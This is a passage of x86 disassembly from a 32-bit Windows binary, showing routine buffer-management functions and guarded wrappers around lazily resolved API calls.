  407ec5:	push   0x0
  407ec7:	push   0x3
  407ec9:	call   0x403539
  407ece:	call   0x407e4f
  407ed3:	jmp    0x407eec
  407ed5:	mov    BYTE PTR ds:0x40c420,0x0
  407edc:	push   ecx
  407edd:	push   0x0
  407edf:	push   0x0
  407ee1:	push   DWORD PTR ds:0x40cb7c
  407ee7:	call   0x403539
  407eec:	pop    ebp
  407eed:	ret    0x4
  407ef0:	int3   
  407ef1:	int3   
  407ef2:	int3   
  407ef3:	int3   
  407ef4:	int3   
  407ef5:	mov    edi,edi
  407ef7:	push   ebp
  407ef8:	mov    ebp,esp
  407efa:	push   ebx
  407efb:	push   esi
  407efc:	mov    esi,ecx
  407efe:	push   edi
  407eff:	mov    edi,DWORD PTR [ebp+0x8]
  407f02:	cmp    edi,DWORD PTR [esi+0x8]
  407f05:	jle    0x407f17
  407f07:	lea    eax,[edi+edi*1]
  407f0a:	push   eax
  407f0b:	push   0x0
  407f0d:	call   DWORD PTR ds:0x40e0b4
  407f13:	mov    ebx,eax
  407f15:	jmp    0x407f1a
  407f17:	lea    ebx,[esi+0xc]
  407f1a:	test   ebx,ebx
  407f1c:	jne    0x407f22
  407f1e:	xor    al,al
  407f20:	jmp    0x407f5e
  407f22:	cmp    BYTE PTR [ebp+0xc],0x0
  407f26:	je     0x407f48
  407f28:	cmp    DWORD PTR [esi],ebx
  407f2a:	je     0x407f48
  407f2c:	mov    ecx,DWORD PTR [esi+0x4]
  407f2f:	cmp    edi,ecx
  407f31:	jge    0x407f35
  407f33:	mov    ecx,edi
  407f35:	test   ecx,ecx
  407f37:	je     0x407f48
  407f39:	mov    eax,DWORD PTR [esi]
  407f3b:	sub    ecx,0x1
  407f3e:	mov    ax,WORD PTR [eax+ecx*2]
  407f42:	mov    WORD PTR [ebx+ecx*2],ax
  407f46:	jne    0x407f39
  407f48:	lea    eax,[esi+0xc]
  407f4b:	cmp    DWORD PTR [esi],eax
  407f4d:	je     0x407f57
  407f4f:	push   DWORD PTR [esi]
  407f51:	call   DWORD PTR ds:0x40e104
  407f57:	mov    DWORD PTR [esi],ebx
  407f59:	mov    al,0x1
  407f5b:	mov    DWORD PTR [esi+0x4],edi
  407f5e:	pop    edi
  407f5f:	pop    esi
  407f60:	pop    ebx
  407f61:	pop    ebp
  407f62:	ret    0x8
  407f65:	int3   
  407f66:	int3   
  407f67:	int3   
  407f68:	int3   
  407f69:	int3   
  407f6a:	mov    edi,edi
  407f6c:	push   esi
  407f6d:	mov    esi,ecx
  407f6f:	cmp    DWORD PTR [esi+0x4],0x1
  407f73:	jle    0x407f7d
  407f75:	push   DWORD PTR [esi]
  407f77:	call   DWORD PTR ds:0x40e104
  407f7d:	lea    eax,[esi+0xc]
  407f80:	mov    DWORD PTR [esi+0x4],0x1
  407f87:	mov    DWORD PTR [esi],eax
  407f89:	pop    esi
  407f8a:	ret    
  407f8b:	int3   
  407f8c:	int3   
  407f8d:	int3   
  407f8e:	int3   
  407f8f:	int3   
  407f90:	mov    edi,edi
  407f92:	push   ebp
  407f93:	mov    ebp,esp
  407f95:	push   ebx
  407f96:	mov    ebx,DWORD PTR [ebp+0x8]
  407f99:	push   esi
  407f9a:	mov    esi,ecx
  407f9c:	push   edi
  407f9d:	cmp    ebx,0x1
  407fa0:	jle    0x407fb2
  407fa2:	lea    eax,[ebx+ebx*1]
  407fa5:	push   eax
  407fa6:	push   0x40
  407fa8:	call   DWORD PTR ds:0x40e0b4
  407fae:	mov    edi,eax
  407fb0:	jmp    0x407fb5
  407fb2:	lea    edi,[esi+0xc]
  407fb5:	test   edi,edi
  407fb7:	jne    0x407fbd
  407fb9:	xor    al,al
  407fbb:	jmp    0x407fd3
  407fbd:	lea    ecx,[esi+0xc]
  407fc0:	cmp    DWORD PTR [esi],ecx
  407fc2:	je     0x407fcc
  407fc4:	push   DWORD PTR [esi]
  407fc6:	call   DWORD PTR ds:0x40e104
  407fcc:	mov    DWORD PTR [esi],edi
  407fce:	mov    al,0x1
  407fd0:	mov    DWORD PTR [esi+0x4],ebx
  407fd3:	pop    edi
  407fd4:	pop    esi
  407fd5:	pop    ebx
  407fd6:	pop    ebp
  407fd7:	ret    0x8
  407fda:	int3   
  407fdb:	int3   
  407fdc:	int3   
  407fdd:	int3   
  407fde:	int3   
  407fdf:	mov    edi,edi
  407fe1:	push   ebp
  407fe2:	mov    ebp,esp
  407fe4:	mov    eax,DWORD PTR [ebp+0x8]
  407fe7:	push   edi
  407fe8:	mov    edi,ecx
  407fea:	mov    ecx,0x200
  407fef:	mov    DWORD PTR [edi+0x4],eax
  407ff2:	cmp    eax,ecx
  407ff4:	jle    0x40800a
  407ff6:	push   eax
  407ff7:	push   0x0
  407ff9:	call   DWORD PTR ds:0x40e0b4
  407fff:	mov    DWORD PTR [edi],eax
  408001:	test   eax,eax
  408003:	jne    0x40801d
  408005:	and    DWORD PTR [edi+0x4],eax
  408008:	jmp    0x40801d
  40800a:	push   esi
  40800b:	push   ecx
  40800c:	lea    esi,[edi+0xc]
  40800f:	push   0x0
  408011:	push   esi
  408012:	call   0x409b76
  408017:	add    esp,0xc
  40801a:	mov    DWORD PTR [edi],esi
  40801c:	pop    esi
  40801d:	mov    eax,edi
  40801f:	pop    edi
  408020:	pop    ebp
  408021:	ret    0x4
  408024:	int3   
  408025:	int3   
  408026:	int3   
  408027:	int3   
  408028:	int3   
  408029:	mov    edi,edi
  40802b:	push   ebp
  40802c:	mov    ebp,esp
  40802e:	push   ebx
  40802f:	push   esi
  408030:	push   edi
  408031:	mov    edi,DWORD PTR [ebp+0x8]
  408034:	mov    esi,ecx
  408036:	cmp    edi,0x400
  40803c:	jle    0x40804e
  40803e:	lea    eax,[edi+edi*1]
  408041:	push   eax
  408042:	push   0x40
  408044:	call   DWORD PTR ds:0x40e0b4
  40804a:	mov    ebx,eax
  40804c:	jmp    0x408051
  40804e:	lea    ebx,[esi+0xc]
  408051:	test   ebx,ebx
  408053:	jne    0x408059
  408055:	xor    al,al
  408057:	jmp    0x40808f
  408059:	cmp    DWORD PTR [esi],ebx
  40805b:	je     0x408079
  40805d:	mov    ecx,DWORD PTR [esi+0x4]
  408060:	cmp    edi,ecx
  408062:	jge    0x408066
  408064:	mov    ecx,edi
  408066:	test   ecx,ecx
  408068:	je     0x408079
  40806a:	mov    eax,DWORD PTR [esi]
  40806c:	sub    ecx,0x1
  40806f:	mov    ax,WORD PTR [eax+ecx*2]
  408073:	mov    WORD PTR [ebx+ecx*2],ax
  408077:	jne    0x40806a
  408079:	lea    eax,[esi+0xc]
  40807c:	cmp    DWORD PTR [esi],eax
  40807e:	je     0x408088
  408080:	push   DWORD PTR [esi]
  408082:	call   DWORD PTR ds:0x40e104
  408088:	mov    DWORD PTR [esi],ebx
  40808a:	mov    al,0x1
  40808c:	mov    DWORD PTR [esi+0x4],edi
  40808f:	pop    edi
  408090:	pop    esi
  408091:	pop    ebx
  408092:	pop    ebp
  408093:	ret    0x4
  408096:	int3   
  408097:	int3   
  408098:	int3   
  408099:	int3   
  40809a:	int3   
  40809b:	mov    edi,edi
  40809d:	push   esi
  40809e:	mov    esi,ecx
  4080a0:	push   edi
  4080a1:	mov    edi,0x104
  4080a6:	cmp    DWORD PTR [esi+0x4],edi
  4080a9:	jle    0x4080b3
  4080ab:	push   DWORD PTR [esi]
  4080ad:	call   DWORD PTR ds:0x40e104
  4080b3:	mov    DWORD PTR [esi+0x4],edi
  4080b6:	lea    eax,[esi+0xc]
  4080b9:	pop    edi
  4080ba:	mov    DWORD PTR [esi],eax
  4080bc:	pop    esi
  4080bd:	ret    
  4080be:	int3   
  4080bf:	int3   
  4080c0:	int3   
  4080c1:	int3   
  4080c2:	int3   
  4080c3:	mov    edi,edi
  4080c5:	push   ebp
  4080c6:	mov    ebp,esp
  4080c8:	push   ebx
  4080c9:	push   esi
  4080ca:	push   edi
  4080cb:	mov    edi,DWORD PTR [ebp+0x8]
  4080ce:	mov    esi,ecx
  4080d0:	cmp    edi,0x104
  4080d6:	jle    0x4080e8
  4080d8:	lea    eax,[edi+edi*1]
  4080db:	push   eax
  4080dc:	push   0x40
  4080de:	call   DWORD PTR ds:0x40e0b4
  4080e4:	mov    ebx,eax
  4080e6:	jmp    0x4080eb
  4080e8:	lea    ebx,[esi+0xc]
  4080eb:	test   ebx,ebx
  4080ed:	jne    0x4080f3
  4080ef:	xor    al,al
  4080f1:	jmp    0x408109
  4080f3:	lea    eax,[esi+0xc]
  4080f6:	cmp    DWORD PTR [esi],eax
  4080f8:	je     0x408102
  4080fa:	push   DWORD PTR [esi]
  4080fc:	call   DWORD PTR ds:0x40e104
  408102:	mov    DWORD PTR [esi],ebx
  408104:	mov    al,0x1
  408106:	mov    DWORD PTR [esi+0x4],edi
  408109:	pop    edi
  40810a:	pop    esi
  40810b:	pop    ebx
  40810c:	pop    ebp
  40810d:	ret    0x8
  408110:	int3   
  408111:	int3   
  408112:	int3   
  408113:	int3   
  408114:	int3   
  408115:	mov    edi,edi
  408117:	push   ebp
  408118:	mov    ebp,esp
  40811a:	mov    eax,DWORD PTR [ebp+0x8]
  40811d:	push   edi
  40811e:	mov    edi,ecx
  408120:	mov    ecx,0x100
  408125:	mov    DWORD PTR [edi+0x4],eax
  408128:	cmp    eax,ecx
  40812a:	jle    0x408140
  40812c:	push   eax
  40812d:	push   0x0
  40812f:	call   DWORD PTR ds:0x40e0b4
  408135:	mov    DWORD PTR [edi],eax
  408137:	test   eax,eax
  408139:	jne    0x408153
  40813b:	and    DWORD PTR [edi+0x4],eax
  40813e:	jmp    0x408153
  408140:	push   esi
  408141:	push   ecx
  408142:	lea    esi,[edi+0xc]
  408145:	push   0x0
  408147:	push   esi
  408148:	call   0x409b76
  40814d:	add    esp,0xc
  408150:	mov    DWORD PTR [edi],esi
  408152:	pop    esi
  408153:	mov    eax,edi
  408155:	pop    edi
  408156:	pop    ebp
  408157:	ret    0x4
  40815a:	int3   
  40815b:	int3   
  40815c:	int3   
  40815d:	int3   
  40815e:	int3   
  40815f:	mov    edi,edi
  408161:	push   ebp
  408162:	mov    ebp,esp
  408164:	push   ecx
  408165:	push   esi
  408166:	push   edi
  408167:	mov    esi,edx
  408169:	xor    eax,eax
  40816b:	mov    edi,ecx
  40816d:	mov    DWORD PTR [ebp-0x4],esi
  408170:	inc    eax
  408171:	mov    ecx,0x40cdbc
  408176:	xchg   DWORD PTR [ecx],eax
  408178:	cmp    eax,0x1
  40817b:	jne    0x408194
  40817d:	mov    esi,ecx
  40817f:	push   0xa
  408181:	call   DWORD PTR ds:0x40e0c4
  408187:	xor    eax,eax
  408189:	inc    eax
  40818a:	xchg   DWORD PTR [esi],eax
  40818c:	cmp    eax,0x1
  40818f:	je     0x40817f
  408191:	mov    esi,DWORD PTR [ebp-0x4]
  408194:	cmp    BYTE PTR ds:0x40b0a0,0x0
  40819b:	mov    eax,ds:0x40cdc0
  4081a0:	je     0x4081c2
  4081a2:	test   eax,eax
  4081a4:	jne    0x4081c2
  4081a6:	mov    ecx,0x4020d0
  4081ab:	call   0x408af6
  4081b0:	test   eax,eax
  4081b2:	mov    ds:0x40cdc0,eax
  4081b7:	sete   cl
  4081ba:	dec    cl
  4081bc:	and    BYTE PTR ds:0x40b0a0,cl
  4081c2:	xor    ecx,ecx
  4081c4:	test   eax,eax
  4081c6:	je     0x4081d8
  4081c8:	push   edi
  4081c9:	push   eax
  4081ca:	call   DWORD PTR ds:0x40e0fc
  4081d0:	mov    ecx,eax
  4081d2:	test   ecx,ecx
  4081d4:	je     0x4081d8
  4081d6:	mov    DWORD PTR [esi],ecx
  4081d8:	and    DWORD PTR ds:0x40cdbc,0x0
  4081df:	mov    eax,ecx
  4081e1:	pop    edi
  4081e2:	pop    esi
  4081e3:	mov    esp,ebp
  4081e5:	pop    ebp
  4081e6:	ret    
  4081e7:	int3   
  4081e8:	int3   
  4081e9:	int3   
  4081ea:	int3   
  4081eb:	int3   
  4081ec:	int3   
  4081ed:	int3   
  4081ee:	int3   
  4081ef:	int3   
  4081f0:	mov    edi,edi
  4081f2:	push   ebp
  4081f3:	mov    ebp,esp
  4081f5:	push   ecx
  4081f6:	mov    eax,ds:0x40b000
  4081fb:	xor    eax,ebp
  4081fd:	mov    DWORD PTR [ebp-0x4],eax
  408200:	mov    edx,0x40b050
  408205:	mov    ecx,0x4020dc
  40820a:	call   0x40815f
  40820f:	test   eax,eax
  408211:	je     0x40822c
  408213:	push   esi
  408214:	push   DWORD PTR [ebp+0xc]
  408217:	mov    esi,DWORD PTR ds:0x40b050
  40821d:	mov    ecx,esi
  40821f:	push   0x0
  408221:	call   DWORD PTR ds:0x40e20c
  408227:	call   esi
  408229:	pop    esi
  40822a:	jmp    0x408231
  40822c:	mov    eax,0x80004005
  408231:	mov    ecx,DWORD PTR [ebp-0x4]
  408234:	xor    ecx,ebp
  408236:	call   0x409090
  40823b:	mov    esp,ebp
  40823d:	pop    ebp
  40823e:	ret    0x8
  408241:	int3   
  408242:	int3   
  408243:	int3   
  408244:	int3   
  408245:	int3   
  408246:	int3   
  408247:	int3   
  408248:	int3   
  408249:	int3   
  40824a:	int3   
  40824b:	int3   
  40824c:	int3   
  40824d:	int3   
  40824e:	int3   
  40824f:	int3   
  408250:	mov    edi,edi
  408252:	push   ebp
  408253:	mov    ebp,esp
  408255:	push   ecx
  408256:	mov    eax,ds:0x40b000
  40825b:	xor    eax,ebp
  40825d:	mov    DWORD PTR [ebp-0x4],eax
  408260:	mov    edx,0x40b04c
  408265:	mov    ecx,0x4020ec
  40826a:	call   0x40815f
  40826f:	test   eax,eax
  408271:	je     0x408296
  408273:	push   esi
  408274:	push   DWORD PTR [ebp+0x18]
  408277:	mov    esi,DWORD PTR ds:0x40b04c
  40827d:	mov    ecx,esi
  40827f:	push   DWORD PTR [ebp+0x14]
  408282:	push   DWORD PTR [ebp+0x10]
  408285:	push   DWORD PTR [ebp+0xc]
  408288:	push   DWORD PTR [ebp+0x8]
  40828b:	call   DWORD PTR ds:0x40e20c
  408291:	call   esi
  408293:	pop    esi
  408294:	jmp    0x40829b
  408296:	mov    eax,0x80004005
  40829b:	mov    ecx,DWORD PTR [ebp-0x4]
  40829e:	xor    ecx,ebp
  4082a0:	call   0x409090
  4082a5:	mov    esp,ebp
  4082a7:	pop    ebp
  4082a8:	ret    0x14
  4082ab:	int3   
  4082ac:	int3   
  4082ad:	int3   
  4082ae:	int3   
  4082af:	int3   
  4082b0:	mov    edi,edi
  4082b2:	push   ebp
  4082b3:	mov    ebp,esp
  4082b5:	push   ecx
  4082b6:	mov    eax,ds:0x40b000
  4082bb:	xor    eax,ebp
  4082bd:	mov    DWORD PTR [ebp-0x4],eax
  4082c0:	mov    edx,0x40b048
  4082c5:	mov    ecx,0x402100
  4082ca:	call   0x40815f
  4082cf:	test   eax,eax
  4082d1:	je     0x408302
  4082d3:	push   esi
  4082d4:	push   DWORD PTR [ebp+0x28]
  4082d7:	mov    esi,DWORD PTR ds:0x40b048
  4082dd:	mov    ecx,esi
  4082df:	push   DWORD PTR [ebp+0x24]
  4082e2:	push   DWORD PTR [ebp+0x20]
  4082e5:	push   DWORD PTR [ebp+0x1c]
  4082e8:	push   DWORD PTR [ebp+0x18]
  4082eb:	push   DWORD PTR [ebp+0x14]
  4082ee:	push   DWORD PTR [ebp+0x10]
  4082f1:	push   DWORD PTR [ebp+0xc]
  4082f4:	push   DWORD PTR [ebp+0x8]
  4082f7:	call   DWORD PTR ds:0x40e20c
  4082fd:	call   esi
  4082ff:	pop    esi
  408300:	jmp    0x408307
  408302:	mov    eax,0x80004005
  408307:	mov    ecx,DWORD PTR [ebp-0x4]
  40830a:	xor    ecx,ebp
  40830c:	call   0x409090
  408311:	mov    esp,ebp
  408313:	pop    ebp
  408314:	ret    0x24
  408317:	int3   
  408318:	int3   
  408319:	int3   
  40831a:	int3   
  40831b:	int3   
  40831c:	int3   
  40831d:	int3   
  40831e:	int3   
  40831f:	int3   
  408320:	mov    edi,edi
  408322:	push   ebp
  408323:	mov    ebp,esp
  408325:	push   ecx
  408326:	mov    eax,ds:0x40b000
  40832b:	xor    eax,ebp
  40832d:	mov    DWORD PTR [ebp-0x4],eax
  408330:	mov    edx,0x40b044
  408335:	mov    ecx,0x402118
  40833a:	call   0x40815f
  40833f:	test   eax,eax
  408341:	je     0x40835a
  408343:	push   esi
  408344:	push   DWORD PTR [ebp+0x8]
  408347:	mov    esi,DWORD PTR ds:0x40b044
  40834d:	mov    ecx,esi
  40834f:	call   DWORD PTR ds:0x40e20c
  408355:	call   esi
  408357:	pop    esi
  408358:	jmp    0x40835c
  40835a:	xor    eax,eax
  40835c:	mov    ecx,DWORD PTR [ebp-0x4]
  40835f:	xor    ecx,ebp
  408361:	call   0x409090
  408366:	mov    esp,ebp
  408368:	pop    ebp
  408369:	ret    0x4
  40836c:	int3   
  40836d:	int3   
  40836e:	int3   
  40836f:	int3   
  408370:	int3   
  408371:	mov    edi,edi
  408373:	push   ebp
  408374:	mov    ebp,esp
  408376:	push   ecx
  408377:	push   esi
  408378:	push   edi
  408379:	mov    esi,edx
  40837b:	xor    eax,eax
  40837d:	mov    edi,ecx
  40837f:	mov    DWORD PTR [ebp-0x4],esi
  408382:	inc    eax
  408383:	mov    ecx,0x40cdcc
  408388:	xchg   DWORD PTR [ecx],eax
  40838a:	cmp    eax,0x1
  40838d:	jne    0x4083a6
  40838f:	mov    esi,ecx
  408391:	push   0xa
  408393:	call   DWORD PTR ds:0x40e0c4
  408399:	xor    eax,eax
  40839b:	inc    eax
  40839c:	xchg   DWORD PTR [esi],eax
  40839e:	cmp    eax,0x1
  4083a1:	je     0x408391
  4083a3:	mov    esi,DWORD PTR [ebp-0x4]
  4083a6:	cmp    BYTE PTR ds:0x40b0a2,0x0
  4083ad:	mov    eax,ds:0x40cdd0
  4083b2:	je     0x4083d5
  4083b4:	test   eax,eax
  4083b6:	jne    0x4083d5
  4083b8:	push   0x402130
  4083bd:	call   DWORD PTR ds:0x40e0bc
  4083c3:	test   eax,eax
  4083c5:	mov    ds:0x40cdd0,eax
  4083ca:	sete   cl
  4083cd:	dec    cl
  4083cf:	and    BYTE PTR ds:0x40b0a2,cl
  4083d5:	xor    ecx,ecx
  4083d7:	test   eax,eax
  4083d9:	je     0x4083eb
  4083db:	push   edi
  4083dc:	push   eax
  4083dd:	call   DWORD PTR ds:0x40e0fc
  4083e3:	mov    ecx,eax
  4083e5:	test   ecx,ecx
  4083e7:	je     0x4083eb
  4083e9:	mov    DWORD PTR [esi],ecx
  4083eb:	and    DWORD PTR ds:0x40cdcc,0x0
  4083f2:	mov    eax,ecx
  4083f4:	pop    edi
  4083f5:	pop    esi
  4083f6:	mov    esp,ebp
  4083f8:	pop    ebp
  4083f9:	ret    
  4083fa:	int3   
  4083fb:	int3   
  4083fc:	int3   
  4083fd:	int3   
  4083fe:	int3   
  4083ff:	mov    edi,edi
  408401:	push   edi
  408402:	mov    edi,0x40cdcc
  408407:	jmp    0x408411
  408409:	push   0xa
  40840b:	call   DWORD PTR ds:0x40e0c4
  408411:	xor    eax,eax
  408413:	inc    eax
  408414:	xchg   DWORD PTR [edi],eax
  408416:	cmp    eax,0x1
  408419:	je     0x408409
  40841b:	cmp    BYTE PTR ds:0x40b0a2,0x0
  408422:	mov    eax,ds:0x40cdd0
  408427:	pop    edi
  408428:	je     0x408447
  40842a:	test   eax,eax
  40842c:	jne    0x40844b
  40842e:	push   0x402130
  408433:	call   DWORD PTR ds:0x40e0bc
  408439:	mov    ds:0x40cdd0,eax
  40843e:	test   eax,eax
  408440:	jne    0x40844b
  408442:	mov    ds:0x40b0a2,al
  408447:	test   eax,eax
  408449:	je     0x408460
  40844b:	push   0x402158
  408450:	push   eax
  408451:	call   DWORD PTR ds:0x40e0fc
  408457:	mov    ds:0x40b060,eax
  40845c:	test   eax,eax
  40845e:	jne    0x40846a
  408460:	mov    eax,0x4088e0
  408465:	mov    ds:0x40b060,eax
  40846a:	and    DWORD PTR ds:0x40cdcc,0x0
  408471:	ret    
  408472:	int3   
  408473:	int3   
  408474:	int3   
  408475:	int3   
  408476:	int3   
  408477:	int3   
  408478:	int3   
  408479:	int3   
  40847a:	int3   
  40847b:	int3   
  40847c:	int3   
  40847d:	int3   
  40847e:	int3   
  40847f:	int3   
  408480:	mov    edi,edi
  408482:	push   ebp
  408483:	mov    ebp,esp
  408485:	push   ecx
  408486:	mov    eax,ds:0x40b000
  40848b:	xor    eax,ebp
  40848d:	mov    DWORD PTR [ebp-0x4],eax
  408490:	mov    edx,0x40b074
  408495:	mov    ecx,0x402144
  40849a:	call   0x408371
  40849f:	test   eax,eax
  4084a1:	je     0x4084b5
  4084a3:	push   esi
  4084a4:	mov    esi,DWORD PTR ds:0x40b074
  4084aa:	mov    ecx,esi
  4084ac:	call   DWORD PTR ds:0x40e20c
  4084b2:	call   esi
  4084b4:	pop    esi
  4084b5:	mov    ecx,DWORD PTR [ebp-0x4]
  4084b8:	xor    ecx,ebp
  4084ba:	call   0x409090
  4084bf:	mov    esp,ebp
  4084c1:	pop    ebp
  4084c2:	ret    
  4084c3:	int3   
  4084c4:	int3   
  4084c5:	int3   
  4084c6:	int3   
  4084c7:	int3   
  4084c8:	int3   
  4084c9:	int3   
  4084ca:	int3   
  4084cb:	int3   
  4084cc:	int3   
  4084cd:	int3   
  4084ce:	int3   
  4084cf:	int3   
  4084d0:	mov    edi,edi
  4084d2:	push   ebp
  4084d3:	mov    ebp,esp
  4084d5:	push   ecx
  4084d6:	mov    eax,ds:0x40b000
  4084db:	xor    eax,ebp
  4084dd:	mov    DWORD PTR [ebp-0x4],eax
  4084e0:	push   esi
  4084e1:	push   DWORD PTR [ebp+0x8]
  4084e4:	push   ecx
  4084e5:	call   0x4083ff
  4084ea:	pop    ecx
  4084eb:	mov    esi,eax
  4084ed:	mov    ecx,eax
  4084ef:	call   DWORD PTR ds:0x40e20c
  4084f5:	call   esi
  4084f7:	mov    ecx,DWORD PTR [ebp-0x4]
  4084fa:	xor    ecx,ebp
  4084fc:	pop    esi
  4084fd:	call   0x409090
  408502:	mov    esp,ebp
  408504:	pop    ebp
  408505:	ret    0x4
  408508:	int3   
  408509:	int3   
  40850a:	int3   
  40850b:	int3   
  40850c:	int3   
  40850d:	int3   
  40850e:	int3   
  40850f:	int3   
  408510:	mov    edi,edi
  408512:	push   ebp
  408513:	mov    ebp,esp
  408515:	push   ecx
  408516:	mov    eax,ds:0x40b000
  40851b:	xor    eax,ebp
  40851d:	mov    DWORD PTR [ebp-0x4],eax
  408520:	mov    edx,0x40b064
  408525:	mov    ecx,0x402170
  40852a:	call   0x408371
  40852f:	test   eax,eax
  408531:	je     0x40855f
  408533:	push   esi
  408534:	push   DWORD PTR [ebp+0x24]
  408537:	mov    esi,DWORD PTR ds:0x40b064
  40853d:	mov    ecx,esi
  40853f:	push   DWORD PTR [ebp+0x20]
  408542:	push   DWORD PTR [ebp+0x1c]
  408545:	push   DWORD PTR [ebp+0x18]
  408548:	push   DWORD PTR [ebp+0x14]
  40854b:	push   DWORD PTR [ebp+0x10]
  40854e:	push   DWORD PTR [ebp+0xc]
  408551:	push   DWORD PTR [ebp+0x8]
  408554:	call   DWORD PTR ds:0x40e20c
  40855a:	call   esi
  40855c:	pop    esi
  40855d:	jmp    0x408564
  40855f:	mov    eax,0x80004005
  408564:	mov    ecx,DWORD PTR [ebp-0x4]
  408567:	xor    ecx,ebp
  408569:	call   0x409090
  40856e:	mov    esp,ebp
  408570:	pop    ebp
  408571:	ret    0x20
  408574:	int3   
  408575:	int3   
  408576:	int3   
  408577:	int3   
  408578:	int3   
  408579:	mov    edi,edi
  40857b:	push   ebp
  40857c:	mov    ebp,esp
  40857e:	push   ecx
  40857f:	push   esi
  408580:	push   edi
  408581:	mov    esi,edx
  408583:	xor    eax,eax
  408585:	mov    edi,ecx
  408587:	mov    DWORD PTR [ebp-0x4],esi
  40858a:	inc    eax
  40858b:	mov    ecx,0x40cdd4
  408590:	xchg   DWORD PTR [ecx],eax
  408592:	cmp    eax,0x1
  408595:	jne    0x4085ae
  408597:	mov    esi,ecx
  408599:	push   0xa
  40859b:	call   DWORD PTR ds:0x40e0c4
  4085a1:	xor    eax,eax
  4085a3:	inc    eax
  4085a4:	xchg   DWORD PTR [esi],eax
  4085a6:	cmp    eax,0x1
  4085a9:	je     0x408599
  4085ab:	mov    esi,DWORD PTR [ebp-0x4]
  4085ae:	cmp    BYTE PTR ds:0x40b0a3,0x0
  4085b5:	mov    eax,ds:0x40cdd8
  4085ba:	je     0x4085dc
  4085bc:	test   eax,eax
  4085be:	jne    0x4085dc
  4085c0:	mov    ecx,0x402180
  4085c5:	call   0x408af6
  4085ca:	test   eax,eax
  4085cc:	mov    ds:0x40cdd8,eax
  4085d1:	sete   cl
  4085d4:	dec    cl
  4085d6:	and    BYTE PTR ds:0x40b0a3,cl
  4085dc:	xor    ecx,ecx
  4085de:	test   eax,eax
  4085e0:	je     0x4085f2
  4085e2:	push   edi
  4085e3:	push   eax
  4085e4:	call   DWORD PTR ds:0x40e0fc
  4085ea:	mov    ecx,eax
  4085ec:	test   ecx,ecx
  4085ee:	je     0x4085f2
  4085f0:	mov    DWORD PTR [esi],ecx
  4085f2:	and    DWORD PTR ds:0x40cdd4,0x0
  4085f9:	mov    eax,ecx
  4085fb:	pop    edi
  4085fc:	pop    esi
  4085fd:	mov    esp,ebp
  4085ff:	pop    ebp
  408600:	ret    
  408601:	int3   
  408602:	int3   
  408603:	int3   
  408604:	int3   
  408605:	int3   
  408606:	int3   
  408607:	int3   
  408608:	int3   
  408609:	int3   
  40860a:	int3   
  40860b:	int3   
  40860c:	int3   
  40860d:	int3   
  40860e:	int3   
  40860f:	int3   
  408610:	mov    edi,edi
  408612:	push   ebp
  408613:	mov    ebp,esp
  408615:	push   ecx
  408616:	mov    eax,ds:0x40b000
  40861b:	xor    eax,ebp
  40861d:	mov    DWORD PTR [ebp-0x4],eax
  408620:	mov    edx,0x40b070
  408625:	mov    ecx,0x402190
  40862a:	call   0x408579
  40862f:	test   eax,eax
  408631:	je     0x40864d
  408633:	push   esi
  408634:	push   DWORD PTR [ebp+0xc]
  408637:	mov    esi,DWORD PTR ds:0x40b070
  40863d:	mov    ecx,esi
  40863f:	push   DWORD PTR [ebp+0x8]
  408642:	call   DWORD PTR ds:0x40e20c
  408648:	call   esi
  40864a:	pop    esi
  40864b:	jmp    0x40864f
  40864d:	xor    eax,eax
  40864f:	mov    ecx,DWORD PTR [ebp-0x4]
  408652:	xor    ecx,ebp
  408654:	call   0x409090
  408659:	mov    esp,ebp
  40865b:	pop    ebp
  40865c:	ret    0x8
  40865f:	int3   
  408660:	int3   
  408661:	int3   
  408662:	int3   
  408663:	int3   
  408664:	int3   
  408665:	int3   
  408666:	int3   
  408667:	int3   
  408668:	int3   
  408669:	int3   
  40866a:	int3   
  40866b:	int3   
  40866c:	int3   
  40866d:	int3   
  40866e:	int3   
  40866f:	int3   
  408670:	mov    edi,edi
  408672:	push   ebp
  408673:	mov    ebp,esp
  408675:	push   ecx
  408676:	mov    eax,ds:0x40b000
  40867b:	xor    eax,ebp
  40867d:	mov    DWORD PTR [ebp-0x4],eax
  408680:	mov    edx,0x40b06c
  408685:	mov    ecx,0x4021a8
  40868a:	call   0x408579
  40868f:	test   eax,eax
  408691:	je     0x4086b3
  408693:	push   esi
  408694:	push   DWORD PTR [ebp+0x14]
  408697:	mov    esi,DWORD PTR ds:0x40b06c
  40869d:	mov    ecx,esi
  40869f:	push   DWORD PTR [ebp+0x10]
  4086a2:	push   DWORD PTR [ebp+0xc]
  4086a5:	push   DWORD PTR [ebp+0x8]
  4086a8:	call   DWORD PTR ds:0x40e20c
  4086ae:	call   esi
  4086b0:	pop    esi
  4086b1:	jmp    0x4086b5
  4086b3:	xor    eax,eax
  4086b5:	mov    ecx,DWORD PTR [ebp-0x4]
  4086b8:	xor    ecx,ebp
  4086ba:	call   0x409090
  4086bf:	mov    esp,ebp
  4086c1:	pop    ebp
  4086c2:	ret    0x10
  4086c5:	int3   
  4086c6:	int3   
  4086c7:	int3   
  4086c8:	int3   
  4086c9:	int3   
  4086ca:	int3   
  4086cb:	int3   
  4086cc:	int3   
  4086cd:	int3   
  4086ce:	int3   
  4086cf:	int3   
  4086d0:	mov    edi,edi
  4086d2:	push   ebp
  4086d3:	mov    ebp,esp
  4086d5:	push   ecx
  4086d6:	mov    eax,ds:0x40b000
  4086db:	xor    eax,ebp
  4086dd:	mov    DWORD PTR [ebp-0x4],eax
  4086e0:	mov    edx,0x40b068
  4086e5:	mov    ecx,0x4021bc
  4086ea:	call   0x408579
  4086ef:	test   eax,eax
  4086f1:	je     0x408713
  4086f3:	push   esi
  4086f4:	push   DWORD PTR [ebp+0x14]
  4086f7:	mov    esi,DWORD PTR ds:0x40b068
  4086fd:	mov    ecx,esi
  4086ff:	push   DWORD PTR [ebp+0x10]
  408702:	push   DWORD PTR [ebp+0xc]
  408705:	push   DWORD PTR [ebp+0x8]
  408708:	call   DWORD PTR ds:0x40e20c
  40870e:	call   esi
  408710:	pop    esi
  408711:	jmp    0x408715
  408713:	xor    eax,eax
  408715:	mov    ecx,DWORD PTR [ebp-0x4]
  408718:	xor    ecx,ebp
  40871a:	call   0x409090
  40871f:	mov    esp,ebp
  408721:	pop    ebp
  408722:	ret    0x10
  408725:	int3   
  408726:	int3   
  408727:	int3   
  408728:	int3   
  408729:	int3   
  40872a:	mov    edi,edi
  40872c:	push   ebp
  40872d:	mov    ebp,esp
  40872f:	push   ecx
  408730:	push   esi
  408731:	push   edi
  408732:	mov    esi,edx
  408734:	xor    eax,eax
  408736:	mov    edi,ecx
  408738:	mov    DWORD PTR [ebp-0x4],esi
